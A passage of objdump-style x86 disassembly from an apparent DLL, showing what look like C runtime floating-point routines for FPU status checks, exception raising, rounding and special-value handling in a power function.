1000b876:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
1000b87a:	c9                   	leave
1000b87b:	c3                   	ret
1000b87c:	8b ff                	mov    %edi,%edi
1000b87e:	55                   	push   %ebp
1000b87f:	8b ec                	mov    %esp,%ebp
1000b881:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000b884:	83 ec 0c             	sub    $0xc,%esp
1000b887:	f6 c1 01             	test   $0x1,%cl
1000b88a:	74 0a                	je     0x1000b896
1000b88c:	db 2d 98 12 01 10    	fldt   0x10011298
1000b892:	db 5d fc             	fistpl -0x4(%ebp)
1000b895:	9b                   	fwait
1000b896:	f6 c1 08             	test   $0x8,%cl
1000b899:	74 10                	je     0x1000b8ab
1000b89b:	9b df e0             	fstsw  %ax
1000b89e:	db 2d 98 12 01 10    	fldt   0x10011298
1000b8a4:	dd 5d f4             	fstpl  -0xc(%ebp)
1000b8a7:	9b 9b df e0          	fstsw  %ax
1000b8ab:	f6 c1 10             	test   $0x10,%cl
1000b8ae:	74 0a                	je     0x1000b8ba
1000b8b0:	db 2d a4 12 01 10    	fldt   0x100112a4
1000b8b6:	dd 5d f4             	fstpl  -0xc(%ebp)
1000b8b9:	9b                   	fwait
1000b8ba:	f6 c1 04             	test   $0x4,%cl
1000b8bd:	74 09                	je     0x1000b8c8
1000b8bf:	d9 ee                	fldz
1000b8c1:	d9 e8                	fld1
1000b8c3:	de f1                	fdivp  %st,%st(1)
1000b8c5:	dd d8                	fstp   %st(0)
1000b8c7:	9b                   	fwait
1000b8c8:	f6 c1 20             	test   $0x20,%cl
1000b8cb:	74 06                	je     0x1000b8d3
1000b8cd:	d9 eb                	fldpi
1000b8cf:	dd 5d f4             	fstpl  -0xc(%ebp)
1000b8d2:	9b                   	fwait
1000b8d3:	c9                   	leave
1000b8d4:	c3                   	ret
1000b8d5:	8b ff                	mov    %edi,%edi
1000b8d7:	55                   	push   %ebp
1000b8d8:	8b ec                	mov    %esp,%ebp
1000b8da:	51                   	push   %ecx
1000b8db:	9b dd 7d fc          	fstsw  -0x4(%ebp)
1000b8df:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
1000b8e3:	c9                   	leave
1000b8e4:	c3                   	ret
1000b8e5:	8b ff                	mov    %edi,%edi
1000b8e7:	55                   	push   %ebp
1000b8e8:	8b ec                	mov    %esp,%ebp
1000b8ea:	51                   	push   %ecx
1000b8eb:	51                   	push   %ecx
1000b8ec:	dd 45 08             	fldl   0x8(%ebp)
1000b8ef:	51                   	push   %ecx
1000b8f0:	51                   	push   %ecx
1000b8f1:	dd 1c 24             	fstpl  (%esp)
1000b8f4:	e8 cf 0a 00 00       	call   0x1000c3c8
1000b8f9:	59                   	pop    %ecx
1000b8fa:	59                   	pop    %ecx
1000b8fb:	a8 90                	test   $0x90,%al
1000b8fd:	75 4a                	jne    0x1000b949
1000b8ff:	dd 45 08             	fldl   0x8(%ebp)
1000b902:	51                   	push   %ecx
1000b903:	51                   	push   %ecx
1000b904:	dd 1c 24             	fstpl  (%esp)
1000b907:	e8 76 02 00 00       	call   0x1000bb82
1000b90c:	dd 45 08             	fldl   0x8(%ebp)
1000b90f:	dd e1                	fucom  %st(1)
1000b911:	df e0                	fnstsw %ax
1000b913:	59                   	pop    %ecx
1000b914:	59                   	pop    %ecx
1000b915:	dd d9                	fstp   %st(1)
1000b917:	f6 c4 44             	test   $0x44,%ah
1000b91a:	7a 2b                	jp     0x1000b947
1000b91c:	dc 0d d0 1a 01 10    	fmull  0x10011ad0
1000b922:	51                   	push   %ecx
1000b923:	51                   	push   %ecx
1000b924:	dd 55 f8             	fstl   -0x8(%ebp)
1000b927:	dd 1c 24             	fstpl  (%esp)
1000b92a:	e8 53 02 00 00       	call   0x1000bb82
1000b92f:	dd 45 f8             	fldl   -0x8(%ebp)
1000b932:	da e9                	fucompp
1000b934:	df e0                	fnstsw %ax
1000b936:	59                   	pop    %ecx
1000b937:	59                   	pop    %ecx
1000b938:	f6 c4 44             	test   $0x44,%ah
1000b93b:	7a 05                	jp     0x1000b942
1000b93d:	6a 02                	push   $0x2
1000b93f:	58                   	pop    %eax
1000b940:	c9                   	leave
1000b941:	c3                   	ret
1000b942:	33 c0                	xor    %eax,%eax
1000b944:	40                   	inc    %eax
1000b945:	c9                   	leave
1000b946:	c3                   	ret
1000b947:	dd d8                	fstp   %st(0)
1000b949:	33 c0                	xor    %eax,%eax
1000b94b:	c9                   	leave
1000b94c:	c3                   	ret
1000b94d:	8b ff                	mov    %edi,%edi
1000b94f:	55                   	push   %ebp
1000b950:	8b ec                	mov    %esp,%ebp
1000b952:	dd 45 08             	fldl   0x8(%ebp)
1000b955:	b9 00 00 f0 7f       	mov    $0x7ff00000,%ecx
1000b95a:	d9 e1                	fabs
1000b95c:	b8 00 00 f0 ff       	mov    $0xfff00000,%eax
1000b961:	39 4d 14             	cmp    %ecx,0x14(%ebp)
1000b964:	75 3b                	jne    0x1000b9a1
1000b966:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
1000b96a:	75 75                	jne    0x1000b9e1
1000b96c:	d9 e8                	fld1
1000b96e:	d8 d1                	fcom   %st(1)
1000b970:	df e0                	fnstsw %ax
1000b972:	f6 c4 05             	test   $0x5,%ah
1000b975:	7a 0f                	jp     0x1000b986
1000b977:	dd d9                	fstp   %st(1)
1000b979:	dd d8                	fstp   %st(0)
1000b97b:	dd 05 60 1c 01 10    	fldl   0x10011c60
1000b981:	e9 e9 00 00 00       	jmp    0x1000ba6f
1000b986:	d8 d1                	fcom   %st(1)
1000b988:	df e0                	fnstsw %ax
1000b98a:	dd d9                	fstp   %st(1)
1000b98c:	f6 c4 41             	test   $0x41,%ah
1000b98f:	8b 45 18             	mov    0x18(%ebp),%eax
1000b992:	0f 85 da 00 00 00    	jne    0x1000ba72
1000b998:	dd d8                	fstp   %st(0)
1000b99a:	d9 ee                	fldz
1000b99c:	e9 d1 00 00 00       	jmp    0x1000ba72
1000b9a1:	39 45 14             	cmp    %eax,0x14(%ebp)
1000b9a4:	75 3b                	jne    0x1000b9e1
1000b9a6:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
1000b9aa:	75 35                	jne    0x1000b9e1
1000b9ac:	d9 e8                	fld1
1000b9ae:	d8 d1                	fcom   %st(1)
1000b9b0:	df e0                	fnstsw %ax
1000b9b2:	f6 c4 05             	test   $0x5,%ah
1000b9b5:	7a 0b                	jp     0x1000b9c2
1000b9b7:	dd d9                	fstp   %st(1)
1000b9b9:	dd d8                	fstp   %st(0)
1000b9bb:	d9 ee                	fldz
1000b9bd:	e9 ad 00 00 00       	jmp    0x1000ba6f
1000b9c2:	d8 d1                	fcom   %st(1)
1000b9c4:	df e0                	fnstsw %ax
1000b9c6:	dd d9                	fstp   %st(1)
1000b9c8:	f6 c4 41             	test   $0x41,%ah
1000b9cb:	8b 45 18             	mov    0x18(%ebp),%eax
1000b9ce:	0f 85 9e 00 00 00    	jne    0x1000ba72
1000b9d4:	dd d8                	fstp   %st(0)
1000b9d6:	dd 05 60 1c 01 10    	fldl   0x10011c60
1000b9dc:	e9 91 00 00 00       	jmp    0x1000ba72
1000b9e1:	dd d8                	fstp   %st(0)
1000b9e3:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
1000b9e6:	75 2e                	jne    0x1000ba16
1000b9e8:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000b9ec:	0f 85 82 00 00 00    	jne    0x1000ba74
1000b9f2:	d9 ee                	fldz
1000b9f4:	dd 45 10             	fldl   0x10(%ebp)
1000b9f7:	d8 d1                	fcom   %st(1)
1000b9f9:	df e0                	fnstsw %ax
1000b9fb:	f6 c4 41             	test   $0x41,%ah
1000b9fe:	0f 84 73 ff ff ff    	je     0x1000b977
1000ba04:	d8 d9                	fcomp  %st(1)
1000ba06:	df e0                	fnstsw %ax
1000ba08:	f6 c4 05             	test   $0x5,%ah
1000ba0b:	8b 45 18             	mov    0x18(%ebp),%eax
1000ba0e:	7b 62                	jnp    0x1000ba72
1000ba10:	dd d8                	fstp   %st(0)
1000ba12:	d9 e8                	fld1
1000ba14:	eb 5c                	jmp    0x1000ba72
1000ba16:	39 45 0c             	cmp    %eax,0xc(%ebp)
1000ba19:	75 59                	jne    0x1000ba74
1000ba1b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000ba1f:	75 53                	jne    0x1000ba74
1000ba21:	dd 45 10             	fldl   0x10(%ebp)
1000ba24:	51                   	push   %ecx
1000ba25:	51                   	push   %ecx
1000ba26:	dd 1c 24             	fstpl  (%esp)
1000ba29:	e8 b7 fe ff ff       	call   0x1000b8e5
1000ba2e:	d9 ee                	fldz
1000ba30:	dd 45 10             	fldl   0x10(%ebp)
1000ba33:	59                   	pop    %ecx
1000ba34:	59                   	pop    %ecx
1000ba35:	d8 d1                	fcom   %st(1)
1000ba37:	8b c8                	mov    %eax,%ecx
1000ba39:	df e0                	fnstsw %ax
1000ba3b:	f6 c4 41             	test   $0x41,%ah
1000ba3e:	75 13                	jne    0x1000ba53
1000ba40:	dd d9                	fstp   %st(1)
1000ba42:	dd d8                	fstp   %st(0)
1000ba44:	dd 05 60 1c 01 10    	fldl   0x10011c60
1000ba4a:	83 f9 01             	cmp    $0x1,%ecx
1000ba4d:	75 20                	jne    0x1000ba6f
1000ba4f:	d9 e0                	fchs
1000ba51:	eb 1c                	jmp    0x1000ba6f
1000ba53:	d8 d9                	fcomp  %st(1)
1000ba55:	df e0                	fnstsw %ax
1000ba57:	f6 c4 05             	test   $0x5,%ah
1000ba5a:	7a 0f                	jp     0x1000ba6b
1000ba5c:	83 f9 01             	cmp    $0x1,%ecx
1000ba5f:	75 0e                	jne    0x1000ba6f
1000ba61:	dd d8                	fstp   %st(0)
1000ba63:	dd 05 70 1c 01 10    	fldl   0x10011c70
1000ba69:	eb 04                	jmp    0x1000ba6f
1000ba6b:	dd d8                	fstp   %st(0)
1000ba6d:	d9 e8                	fld1
1000ba6f:	8b 45 18             	mov    0x18(%ebp),%eax
1000ba72:	dd 18                	fstpl  (%eax)
1000ba74:	33 c0                	xor    %eax,%eax
1000ba76:	5d                   	pop    %ebp
1000ba77:	c3                   	ret
1000ba78:	8b ff                	mov    %edi,%edi
1000ba7a:	53                   	push   %ebx
1000ba7b:	8b dc                	mov    %esp,%ebx
1000ba7d:	51                   	push   %ecx
1000ba7e:	51                   	push   %ecx
1000ba7f:	83 e4 f0             	and    $0xfffffff0,%esp
1000ba82:	83 c4 04             	add    $0x4,%esp
1000ba85:	55                   	push   %ebp
1000ba86:	8b 6b 04             	mov    0x4(%ebx),%ebp
1000ba89:	89 6c 24 04          	mov    %ebp,0x4(%esp)
1000ba8d:	8b ec                	mov    %esp,%ebp
1000ba8f:	81 ec 88 00 00 00    	sub    $0x88,%esp
1000ba95:	a1 04 30 01 10       	mov    0x10013004,%eax
1000ba9a:	33 c5                	xor    %ebp,%eax
1000ba9c:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000ba9f:	8b 43 10             	mov    0x10(%ebx),%eax
1000baa2:	56                   	push   %esi
1000baa3:	8b 73 0c             	mov    0xc(%ebx),%esi
1000baa6:	57                   	push   %edi
1000baa7:	0f b7 08             	movzwl (%eax),%ecx
1000baaa:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
1000bab0:	8b 06                	mov    (%esi),%eax
1000bab2:	83 e8 01             	sub    $0x1,%eax
1000bab5:	74 29                	je     0x1000bae0
1000bab7:	83 e8 01             	sub    $0x1,%eax
1000baba:	74 20                	je     0x1000badc
1000babc:	83 e8 01             	sub    $0x1,%eax
1000babf:	74 17                	je     0x1000bad8
1000bac1:	83 e8 01             	sub    $0x1,%eax
1000bac4:	74 0e                	je     0x1000bad4
1000bac6:	83 e8 01             	sub    $0x1,%eax
1000bac9:	74 15                	je     0x1000bae0
1000bacb:	83 e8 03             	sub    $0x3,%eax
1000bace:	75 6c                	jne    0x1000bb3c
1000bad0:	6a 10                	push   $0x10
1000bad2:	eb 0e                	jmp    0x1000bae2
1000bad4:	6a 12                	push   $0x12
1000bad6:	eb 0a                	jmp    0x1000bae2
1000bad8:	6a 11                	push   $0x11
1000bada:	eb 06                	jmp    0x1000bae2
1000badc:	6a 04                	push   $0x4
1000bade:	eb 02                	jmp    0x1000bae2
1000bae0:	6a 08                	push   $0x8
1000bae2:	5f                   	pop    %edi
1000bae3:	51                   	push   %ecx
1000bae4:	8d 46 18             	lea    0x18(%esi),%eax
1000bae7:	50                   	push   %eax
1000bae8:	57                   	push   %edi
1000bae9:	e8 aa 01 00 00       	call   0x1000bc98
1000baee:	83 c4 0c             	add    $0xc,%esp
1000baf1:	85 c0                	test   %eax,%eax
1000baf3:	75 47                	jne    0x1000bb3c
1000baf5:	8b 4b 08             	mov    0x8(%ebx),%ecx
1000baf8:	83 f9 10             	cmp    $0x10,%ecx
1000bafb:	74 10                	je     0x1000bb0d
1000bafd:	83 f9 16             	cmp    $0x16,%ecx
1000bb00:	74 0b                	je     0x1000bb0d
1000bb02:	83 f9 1d             	cmp    $0x1d,%ecx
1000bb05:	74 06                	je     0x1000bb0d
1000bb07:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
1000bb0b:	eb 12                	jmp    0x1000bb1f
1000bb0d:	8b 45 c0             	mov    -0x40(%ebp),%eax
1000bb10:	dd 46 10             	fldl   0x10(%esi)
1000bb13:	83 e0 e3             	and    $0xffffffe3,%eax
1000bb16:	83 c8 03             	or     $0x3,%eax
1000bb19:	dd 5d b0             	fstpl  -0x50(%ebp)
1000bb1c:	89 45 c0             	mov    %eax,-0x40(%ebp)
1000bb1f:	8d 46 18             	lea    0x18(%esi),%eax
1000bb22:	50                   	push   %eax
1000bb23:	8d 46 08             	lea    0x8(%esi),%eax
1000bb26:	50                   	push   %eax
1000bb27:	51                   	push   %ecx
1000bb28:	57                   	push   %edi
1000bb29:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
1000bb2f:	50                   	push   %eax
1000bb30:	8d 45 80             	lea    -0x80(%ebp),%eax
1000bb33:	50                   	push   %eax
1000bb34:	e8 4a 03 00 00       	call   0x1000be83
1000bb39:	83 c4 18             	add    $0x18,%esp
1000bb3c:	68 ff ff 00 00       	push   $0xffff
1000bb41:	ff b5 7c ff ff ff    	push   -0x84(%ebp)
1000bb47:	e8 06 fd ff ff       	call   0x1000b852
1000bb4c:	83 3e 08             	cmpl   $0x8,(%esi)
1000bb4f:	59                   	pop    %ecx
1000bb50:	59                   	pop    %ecx
1000bb51:	74 14                	je     0x1000bb67
1000bb53:	e8 ca c6 ff ff       	call   0x10008222
1000bb58:	84 c0                	test   %al,%al
1000bb5a:	74 0b                	je     0x1000bb67
1000bb5c:	56                   	push   %esi
1000bb5d:	e8 e7 c6 ff ff       	call   0x10008249
1000bb62:	59                   	pop    %ecx
1000bb63:	85 c0                	test   %eax,%eax
1000bb65:	75 08                	jne    0x1000bb6f
1000bb67:	ff 36                	push   (%esi)
1000bb69:	e8 2e 06 00 00       	call   0x1000c19c
1000bb6e:	59                   	pop    %ecx
1000bb6f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000bb72:	5f                   	pop    %edi
1000bb73:	33 cd                	xor    %ebp,%ecx
1000bb75:	5e                   	pop    %esi
1000bb76:	e8 0e 61 ff ff       	call   0x10001c89
1000bb7b:	8b e5                	mov    %ebp,%esp
1000bb7d:	5d                   	pop    %ebp
1000bb7e:	8b e3                	mov    %ebx,%esp
1000bb80:	5b                   	pop    %ebx
1000bb81:	c3                   	ret
1000bb82:	8b ff                	mov    %edi,%edi
1000bb84:	55                   	push   %ebp
1000bb85:	8b ec                	mov    %esp,%ebp
1000bb87:	51                   	push   %ecx
1000bb88:	51                   	push   %ecx
1000bb89:	dd 45 08             	fldl   0x8(%ebp)
1000bb8c:	d9 fc                	frndint
1000bb8e:	dd 5d f8             	fstpl  -0x8(%ebp)
1000bb91:	dd 45 f8             	fldl   -0x8(%ebp)
1000bb94:	c9                   	leave
1000bb95:	c3                   	ret
1000bb96:	8b ff                	mov    %edi,%edi
1000bb98:	55                   	push   %ebp
1000bb99:	8b ec                	mov    %esp,%ebp
1000bb9b:	8b 45 08             	mov    0x8(%ebp),%eax
1000bb9e:	a8 20                	test   $0x20,%al
1000bba0:	74 04                	je     0x1000bba6
1000bba2:	6a 05                	push   $0x5
1000bba4:	eb 17                	jmp    0x1000bbbd
1000bba6:	a8 08                	test   $0x8,%al
1000bba8:	74 05                	je     0x1000bbaf
1000bbaa:	33 c0                	xor    %eax,%eax
1000bbac:	40                   	inc    %eax
1000bbad:	5d                   	pop    %ebp
1000bbae:	c3                   	ret
1000bbaf:	a8 04                	test   $0x4,%al
1000bbb1:	74 04                	je     0x1000bbb7
1000bbb3:	6a 02                	push   $0x2
1000bbb5:	eb 06                	jmp    0x1000bbbd
1000bbb7:	a8 01                	test   $0x1,%al
1000bbb9:	74 05                	je     0x1000bbc0
1000bbbb:	6a 03                	push   $0x3
1000bbbd:	58                   	pop    %eax
1000bbbe:	5d                   	pop    %ebp
1000bbbf:	c3                   	ret
1000bbc0:	0f b6 c0             	movzbl %al,%eax
1000bbc3:	83 e0 02             	and    $0x2,%eax
1000bbc6:	03 c0                	add    %eax,%eax
1000bbc8:	5d                   	pop    %ebp
1000bbc9:	c3                   	ret
1000bbca:	8b ff                	mov    %edi,%edi
1000bbcc:	53                   	push   %ebx
1000bbcd:	8b dc                	mov    %esp,%ebx
1000bbcf:	51                   	push   %ecx
1000bbd0:	51                   	push   %ecx
1000bbd1:	83 e4 f0             	and    $0xfffffff0,%esp
1000bbd4:	83 c4 04             	add    $0x4,%esp
1000bbd7:	55                   	push   %ebp
1000bbd8:	8b 6b 04             	mov    0x4(%ebx),%ebp
1000bbdb:	89 6c 24 04          	mov    %ebp,0x4(%esp)
1000bbdf:	8b ec                	mov    %esp,%ebp
1000bbe1:	81 ec 88 00 00 00    	sub    $0x88,%esp
1000bbe7:	a1 04 30 01 10       	mov    0x10013004,%eax
1000bbec:	33 c5                	xor    %ebp,%eax
1000bbee:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000bbf1:	56                   	push   %esi
1000bbf2:	8b 73 20             	mov    0x20(%ebx),%esi
1000bbf5:	8d 43 18             	lea    0x18(%ebx),%eax
1000bbf8:	57                   	push   %edi
1000bbf9:	56                   	push   %esi
1000bbfa:	50                   	push   %eax
1000bbfb:	ff 73 08             	push   0x8(%ebx)
1000bbfe:	e8 95 00 00 00       	call   0x1000bc98
1000bc03:	83 c4 0c             	add    $0xc,%esp
1000bc06:	85 c0                	test   %eax,%eax
1000bc08:	75 26                	jne    0x1000bc30
1000bc0a:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
1000bc0e:	50                   	push   %eax
1000bc0f:	8d 43 18             	lea    0x18(%ebx),%eax
1000bc12:	50                   	push   %eax
1000bc13:	8d 43 10             	lea    0x10(%ebx),%eax
1000bc16:	50                   	push   %eax
1000bc17:	ff 73 0c             	push   0xc(%ebx)
1000bc1a:	8d 43 20             	lea    0x20(%ebx),%eax
1000bc1d:	ff 73 08             	push   0x8(%ebx)
1000bc20:	50                   	push   %eax
1000bc21:	8d 45 80             	lea    -0x80(%ebp),%eax
1000bc24:	50                   	push   %eax
1000bc25:	e8 7c 02 00 00       	call   0x1000bea6
1000bc2a:	8b 73 20             	mov    0x20(%ebx),%esi
1000bc2d:	83 c4 1c             	add    $0x1c,%esp
1000bc30:	ff 73 08             	push   0x8(%ebx)
1000bc33:	e8 5e ff ff ff       	call   0x1000bb96
1000bc38:	59                   	pop    %ecx
1000bc39:	8b f8                	mov    %eax,%edi
1000bc3b:	e8 e2 c5 ff ff       	call   0x10008222
1000bc40:	84 c0                	test   %al,%al
1000bc42:	74 29                	je     0x1000bc6d
1000bc44:	85 ff                	test   %edi,%edi
1000bc46:	74 25                	je     0x1000bc6d
1000bc48:	dd 43 18             	fldl   0x18(%ebx)
1000bc4b:	56                   	push   %esi
1000bc4c:	83 ec 18             	sub    $0x18,%esp
1000bc4f:	dd 5c 24 10          	fstpl  0x10(%esp)
1000bc53:	d9 ee                	fldz
1000bc55:	dd 5c 24 08          	fstpl  0x8(%esp)
1000bc59:	dd 43 10             	fldl   0x10(%ebx)
1000bc5c:	dd 1c 24             	fstpl  (%esp)
1000bc5f:	ff 73 0c             	push   0xc(%ebx)
1000bc62:	57                   	push   %edi
1000bc63:	e8 63 05 00 00       	call   0x1000c1cb
1000bc68:	83 c4 24             	add    $0x24,%esp
1000bc6b:	eb 18                	jmp    0x1000bc85
1000bc6d:	57                   	push   %edi
1000bc6e:	e8 29 05 00 00       	call   0x1000c19c
1000bc73:	c7 04 24 ff ff 00 00 	movl   $0xffff,(%esp)
1000bc7a:	56                   	push   %esi
1000bc7b:	e8 d2 fb ff ff       	call   0x1000b852
1000bc80:	dd 43 18             	fldl   0x18(%ebx)
1000bc83:	59                   	pop    %ecx
1000bc84:	59                   	pop    %ecx
1000bc85:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000bc88:	5f                   	pop    %edi
1000bc89:	33 cd                	xor    %ebp,%ecx
1000bc8b:	5e                   	pop    %esi
1000bc8c:	e8 f8 5f ff ff       	call   0x10001c89
1000bc91:	8b e5                	mov    %ebp,%esp
1000bc93:	5d                   	pop    %ebp
1000bc94:	8b e3                	mov    %ebx,%esp
1000bc96:	5b                   	pop    %ebx
1000bc97:	c3                   	ret
1000bc98:	8b ff                	mov    %edi,%edi
1000bc9a:	55                   	push   %ebp
1000bc9b:	8b ec                	mov    %esp,%ebp
1000bc9d:	83 ec 10             	sub    $0x10,%esp
1000bca0:	53                   	push   %ebx
1000bca1:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000bca4:	56                   	push   %esi
1000bca5:	8b f3                	mov    %ebx,%esi
1000bca7:	83 e6 1f             	and    $0x1f,%esi
1000bcaa:	f6 c3 08             	test   $0x8,%bl
1000bcad:	74 16                	je     0x1000bcc5
1000bcaf:	f6 45 10 01          	testb  $0x1,0x10(%ebp)
1000bcb3:	74 10                	je     0x1000bcc5
1000bcb5:	6a 01                	push   $0x1
1000bcb7:	e8 c0 fb ff ff       	call   0x1000b87c
1000bcbc:	59                   	pop    %ecx
1000bcbd:	83 e6 f7             	and    $0xfffffff7,%esi
1000bcc0:	e9 9d 01 00 00       	jmp    0x1000be62
1000bcc5:	8b c3                	mov    %ebx,%eax
1000bcc7:	23 45 10             	and    0x10(%ebp),%eax
1000bcca:	a8 04                	test   $0x4,%al
1000bccc:	74 10                	je     0x1000bcde
1000bcce:	6a 04                	push   $0x4
1000bcd0:	e8 a7 fb ff ff       	call   0x1000b87c
1000bcd5:	59                   	pop    %ecx
1000bcd6:	83 e6 fb             	and    $0xfffffffb,%esi
1000bcd9:	e9 84 01 00 00       	jmp    0x1000be62
1000bcde:	f6 c3 01             	test   $0x1,%bl
1000bce1:	0f 84 9a 00 00 00    	je     0x1000bd81
1000bce7:	f6 45 10 08          	testb  $0x8,0x10(%ebp)
1000bceb:	0f 84 90 00 00 00    	je     0x1000bd81
1000bcf1:	6a 08                	push   $0x8
1000bcf3:	e8 84 fb ff ff       	call   0x1000b87c
1000bcf8:	8b 45 10             	mov    0x10(%ebp),%eax
1000bcfb:	59                   	pop    %ecx
1000bcfc:	b9 00 0c 00 00       	mov    $0xc00,%ecx
1000bd01:	23 c1                	and    %ecx,%eax
1000bd03:	74 54                	je     0x1000bd59
1000bd05:	3d 00 04 00 00       	cmp    $0x400,%eax
1000bd0a:	74 37                	je     0x1000bd43
1000bd0c:	3d 00 08 00 00       	cmp    $0x800,%eax
1000bd11:	74 1a                	je     0x1000bd2d
1000bd13:	3b c1                	cmp    %ecx,%eax
1000bd15:	75 62                	jne    0x1000bd79
1000bd17:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000bd1a:	d9 ee                	fldz
1000bd1c:	dc 19                	fcompl (%ecx)
1000bd1e:	df e0                	fnstsw %ax
1000bd20:	dd 05 68 1c 01 10    	fldl   0x10011c68
1000bd26:	f6 c4 05             	test   $0x5,%ah
1000bd29:	7b 4c                	jnp    0x1000bd77
1000bd2b:	eb 48                	jmp    0x1000bd75
1000bd2d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000bd30:	d9 ee                	fldz
1000bd32:	dc 19                	fcompl (%ecx)
1000bd34:	df e0                	fnstsw %ax
1000bd36:	f6 c4 05             	test   $0x5,%ah
1000bd39:	7b 2c                	jnp    0x1000bd67
1000bd3b:	dd 05 68 1c 01 10    	fldl   0x10011c68
1000bd41:	eb 32                	jmp    0x1000bd75
1000bd43:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000bd46:	d9 ee                	fldz
1000bd48:	dc 19                	fcompl (%ecx)
1000bd4a:	df e0                	fnstsw %ax
1000bd4c:	f6 c4 05             	test   $0x5,%ah
1000bd4f:	7a 1e                	jp     0x1000bd6f
1000bd51:	dd 05 68 1c 01 10    	fldl   0x10011c68
1000bd57:	eb 1e                	jmp    0x1000bd77
1000bd59:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000bd5c:	d9 ee                	fldz
1000bd5e:	dc 19                	fcompl (%ecx)
1000bd60:	df e0                	fnstsw %ax
1000bd62:	f6 c4 05             	test   $0x5,%ah
1000bd65:	7a 08                	jp     0x1000bd6f
1000bd67:	dd 05 60 1c 01 10    	fldl   0x10011c60
1000bd6d:	eb 08                	jmp    0x1000bd77
1000bd6f:	dd 05 60 1c 01 10    	fldl   0x10011c60
1000bd75:	d9 e0                	fchs
1000bd77:	dd 19                	fstpl  (%ecx)
1000bd79:	83 e6 fe             	and    $0xfffffffe,%esi
1000bd7c:	e9 e1 00 00 00       	jmp    0x1000be62
1000bd81:	f6 c3 02             	test   $0x2,%bl
1000bd84:	0f 84 d8 00 00 00    	je     0x1000be62
1000bd8a:	f6 45 10 10          	testb  $0x10,0x10(%ebp)
1000bd8e:	0f 84 ce 00 00 00    	je     0x1000be62
1000bd94:	8b 45 0c             	mov    0xc(%ebp),%eax
1000bd97:	57                   	push   %edi
1000bd98:	8b fb                	mov    %ebx,%edi
1000bd9a:	c1 ef 04             	shr    $0x4,%edi
1000bd9d:	dd 00                	fldl   (%eax)
1000bd9f:	83 e7 01             	and    $0x1,%edi
1000bda2:	d9 ee                	fldz
1000bda4:	dd e9                	fucomp %st(1)
1000bda6:	df e0                	fnstsw %ax
1000bda8:	f6 c4 44             	test   $0x44,%ah
1000bdab:	0f 8b 9c 00 00 00    	jnp    0x1000be4d
1000bdb1:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000bdb4:	50                   	push   %eax
1000bdb5:	51                   	push   %ecx
1000bdb6:	51                   	push   %ecx
1000bdb7:	dd 1c 24             	fstpl  (%esp)
1000bdba:	e8 ac 04 00 00       	call   0x1000c26b
1000bdbf:	8b 55 fc             	mov    -0x4(%ebp),%edx
1000bdc2:	83 c4 0c             	add    $0xc,%esp
1000bdc5:	81 c2 00 fa ff ff    	add    $0xfffffa00,%edx
1000bdcb:	dd 55 f0             	fstl   -0x10(%ebp)
1000bdce:	d9 ee                	fldz
1000bdd0:	81 fa ce fb ff ff    	cmp    $0xfffffbce,%edx
1000bdd6:	7d 07                	jge    0x1000bddf
1000bdd8:	33 ff                	xor    %edi,%edi
1000bdda:	de c9                	fmulp  %st,%st(1)
1000bddc:	47                   	inc    %edi
1000bddd:	eb 67                	jmp    0x1000be46
1000bddf:	de d9                	fcompp
1000bde1:	df e0                	fnstsw %ax
1000bde3:	f6 c4 41             	test   $0x41,%ah
1000bde6:	75 09                	jne    0x1000bdf1
1000bde8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000bdef:	eb 04                	jmp    0x1000bdf5
1000bdf1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000bdf5:	8b 45 f6             	mov    -0xa(%ebp),%eax
1000bdf8:	b9 03 fc ff ff       	mov    $0xfffffc03,%ecx
1000bdfd:	83 e0 0f             	and    $0xf,%eax
1000be00:	83 c8 10             	or     $0x10,%eax
1000be03:	66 89 45 f6          	mov    %ax,-0xa(%ebp)
1000be07:	3b d1                	cmp    %ecx,%edx
1000be09:	7d 30                	jge    0x1000be3b
1000be0b:	8b 45 f0             	mov    -0x10(%ebp),%eax
1000be0e:	2b ca                	sub    %edx,%ecx
1000be10:	8b 55 f4             	mov    -0xc(%ebp),%edx
1000be13:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
1000be17:	74 05                	je     0x1000be1e
1000be19:	85 ff                	test   %edi,%edi
1000be1b:	75 01                	jne    0x1000be1e
1000be1d:	47                   	inc    %edi
1000be1e:	d1 e8                	shr    $1,%eax
1000be20:	f6 45 f4 01          	testb  $0x1,-0xc(%ebp)
1000be24:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000be27:	74 08                	je     0x1000be31
1000be29:	0d 00 00 00 80       	or     $0x80000000,%eax
1000be2e:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000be31:	d1 ea                	shr    $1,%edx
1000be33:	89 55 f4             	mov    %edx,-0xc(%ebp)
1000be36:	83 e9 01             	sub    $0x1,%ecx
1000be39:	75 d8                	jne    0x1000be13
1000be3b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
1000be3f:	dd 45 f0             	fldl   -0x10(%ebp)
1000be42:	74 02                	je     0x1000be46
1000be44:	d9 e0                	fchs
1000be46:	8b 45 0c             	mov    0xc(%ebp),%eax
1000be49:	dd 18                	fstpl  (%eax)
1000be4b:	eb 05                	jmp    0x1000be52
1000be4d:	33 ff                	xor    %edi,%edi
1000be4f:	dd d8                	fstp   %st(0)
1000be51:	47                   	inc    %edi
1000be52:	85 ff                	test   %edi,%edi
